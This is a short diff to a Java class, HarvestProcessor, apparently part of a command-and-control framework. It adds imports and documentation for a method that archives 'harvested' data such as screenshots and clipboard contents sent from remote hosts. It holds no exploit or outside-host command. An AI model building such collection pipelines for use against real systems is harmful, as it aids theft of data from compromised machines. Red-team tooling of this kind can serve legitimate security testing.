@@ -7,8 +7,10 @@ import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.Date;
+import java.util.Properties;
 
 import c2.http.HTTPSManager;
+import c2.session.IOManager;
 
 public class HarvestProcessor {
 
@@ -83,6 +85,18 @@ public class HarvestProcessor {
 		}
 	}
 
+	
+	/**
+	* C2Interface instances use this method to record "harvest" records. This is usually in the form of files that
+	* have been sent for extraction through a special command. For example, screenshots and clipboards are saved with this
+	* method. However, any arbitrary text resource can be saved in a time tagged archive with this method. 
+	
+	* @param  harvestHeader  An arbitrary string identify for the type of resource to be saved
+	* @param  hostname The hostname of the system sending the resource
+	* @param  pid The process ID of the transmitting daemon
+	* @param  username The username under which the transmitting daemon is sending
+	* @param  file The content to be saved as the harvested resource
+	*/
 	public void processHarvest(String harvestHeader, String hostname, String pid, String username, String file) {
 		try {
 			String baseDir = lz + File.separator + hostname + pid + username;
